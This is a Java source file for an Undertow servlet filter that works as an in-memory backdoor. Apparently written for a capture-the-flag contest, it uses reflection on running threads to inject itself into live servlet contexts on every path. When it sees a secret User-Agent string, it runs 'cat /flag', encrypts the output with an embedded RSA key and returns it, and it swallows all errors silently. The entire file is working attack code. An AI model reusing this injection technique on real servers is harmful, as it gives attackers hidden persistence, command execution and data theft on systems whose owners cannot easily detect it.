package tech.pdai.springboot.helloworld.undertow;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;
import java.util.zip.GZIPInputStream;
import javax.crypto.Cipher;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;

public class UndertowFilter2 implements Filter {


    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try {
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            String path = request.getServletPath();
            if (path.startsWith("/doc") || path.startsWith("/json") || path.startsWith("/shell")) {
                return;
            }
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getHeader("User-Agent").contains("Windows NT 10.0; Linux64")) {
                InputStream in = Runtime.getRuntime().exec("cat /flag").getInputStream();

                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";

                String publicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCSPJ9ohMbyj46S9/9nQgD72OuPIVPSKpPhbfgTh+NwhzxyBVb8CXqMNoBcUTkMPJrz57/i/QkQv9OeY0HiOabWC3w2H0HULdPrQCTRCUVy6ag1Ed2gLtr9U5ZhkXeBabCOvIrHbsnTQWrR1yGT5YwPda1WL0EmVscLe8TSyvXViQIDAQAB";
                byte[] decoded = base64Decode(publicKey);
                RSAPublicKey pubKey = (RSAPublicKey) KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(decoded));
                Cipher cipher = Cipher.getInstance("RSA");
                cipher.init(Cipher.ENCRYPT_MODE, pubKey);
                String outStr = base64Encode(cipher.doFinal(output.getBytes("UTF-8")));
                servletResponse.getWriter().write(outStr);
                return;
            } else {
//                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        } catch (Exception e) {

        }

    }

    public void destroy() {

    }


    public static List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));

        for(int i = 0; i < threads.length; ++i) {
            try {
                Object requestContext = invokeMethod(threads[i].getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
                if (servletContext != null) {
                    contexts.add(servletContext);
                }
            } catch (Exception var6) {
            }
        }

        return contexts;
    }


    public static void addFilter(Object context, Object filter) {
        String filterClassName = filter.getClass().getName();

        try {
            if (isInjected(context, filterClassName)) {
                return;
            }

            Class filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
            Object deploymentInfo = getFV(context, "deploymentInfo");
            Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(filterClassName, filter.getClass());
            invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
            Object deploymentImpl = getFV(context, "deployment");
            Object managedFilters = invokeMethod(deploymentImpl, "getFilters");
            invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
            invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{Integer.TYPE, String.class, String.class, DispatcherType.class}, new Object[]{0, filterClassName, "/*", DispatcherType.REQUEST});
        } catch (Throwable var9) {
        }

    }

    public static boolean isInjected(Object context, String evilClassName) throws Exception {
        Map<String, Object> filters = (HashMap)getFV(getFV(context, "deploymentInfo"), "filters");
        Iterator var4 = filters.entrySet().iterator();

        Class filterClass;
        do {
            if (!var4.hasNext()) {
                return false;
            }

            Map.Entry<String, Object> filter = (Map.Entry)var4.next();
            filterClass = (Class)getFV(filter.getValue(), "filterClass");
        } while(!filterClass.getName().equals(evilClassName));

        return true;
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }
    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    static {
        try {
            List<Object> contexts = getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                Object filter = new UndertowFilter2();
                addFilter(context, filter);
            }
        } catch (Exception var5) {
        }
    }
}
